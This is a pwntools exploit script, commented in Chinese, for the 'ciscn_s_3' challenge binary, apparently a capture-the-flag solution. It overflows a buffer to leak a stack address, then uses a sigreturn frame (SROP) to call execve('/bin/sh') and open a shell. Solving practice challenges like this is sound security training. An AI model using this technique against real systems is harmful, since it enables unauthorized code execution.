from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./ciscn_s_3')

vuln       = 0x4004ED
syscall    = 0x400517
mov_rax_15 = 0x4004DA

# 获取栈地址
# vuln没有leave所以rbp不变, 返回地址为push rbp压入栈所以rsp和原来一样, buf地址不发生改变
payload1 = b'a'*0x10+p64(vuln)
p.send(payload1)
stack = u64(p.recv()[0x20:0x20 + 8]) - 0x148 # 本地调试偏移为0x148, buu远程是0x118

#SROP
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rip = syscall
frame.rdi = stack
frame.rsi = 0
frame.rdx = 0

# 执行syscall调用rt_sigreturn函数设置寄存器的值然后执行59号系统中断(execve("/bin/sh", 0, 0))
payload2 = b'/bin/sh\0x00'.ljust(0x10, b'a') + p64(mov_rax_15) + p64(syscall) + bytes(frame)
p.send(payload2)
p.interactive()
